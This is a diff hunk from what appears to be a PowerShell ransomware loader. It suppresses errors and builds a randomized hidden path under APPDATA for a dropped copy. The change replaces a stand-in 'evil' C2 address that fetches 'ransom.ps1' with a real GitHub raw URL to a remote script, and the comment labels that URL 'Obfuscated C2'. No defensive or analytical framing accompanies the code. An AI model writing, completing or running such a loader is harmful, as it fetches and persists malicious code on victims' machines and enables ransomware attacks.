@@ -3,7 +3,7 @@
 
 # IRM Self-Reference & Local Copy Creation
 $ErrorActionPreference = "SilentlyContinue"
-$scriptUrl = "https://evil$(Get-Random -Min 1000 -Max 9999).com/ransom.ps1"  # Obfuscated C2
+$scriptUrl = "https://raw.githubusercontent.com/Anhdeface/only/refs/heads/main/ware110cc.ps1"  # Obfuscated C2
 $localCopyPath = "$env:APPDATA\$([char](65 + (Get-Random -Max 26)))$([char](97 + (Get-Random -Max 26)))cache\upd$(Get-Random -Max 999).ps1"  # Randomized
 
 # Function to Fetch & Drop Local Copy (Idempotent)
